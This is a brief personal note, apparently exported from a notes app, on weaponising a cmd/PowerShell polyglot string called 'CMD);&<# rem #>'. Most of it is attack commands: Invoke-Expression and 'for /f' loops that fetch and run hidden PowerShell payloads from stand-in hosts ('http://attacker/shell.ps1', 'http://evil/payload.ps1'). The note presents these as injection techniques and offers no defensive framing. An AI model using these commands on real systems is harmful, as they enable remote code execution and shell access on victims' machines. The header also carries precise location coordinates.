---
title: 'Weaponizing the CMD);&<# rem #> Structure'
updated: 2025-04-19 11:16:15Z
created: 2025-04-19 10:51:37Z
latitude: -33.78668940
longitude: 150.95264980
altitude: 0.0000
---

## Determine what environment commands are run in

`(dir 2>&1 *'|echo CMD);&<# rem #>echo PowerShell`
is **inert unless executed inside a context** that **evaluatees the full line**

**Injected Inside a Vulnerable Script or Service**
*PowerShell*
`Invoke-Expression "(dir 2>&1 *'|echo powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1'));&"`

*cmd*
`for /f "delims=" %i in ('dir 2^>^&1 *^|echo calc.exe') do @%i`

`for /f "delims=" %i in ('dir 2^>^&1 *^|echo powershell -w hidden -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://evil/payload.ps1')"') do @%i`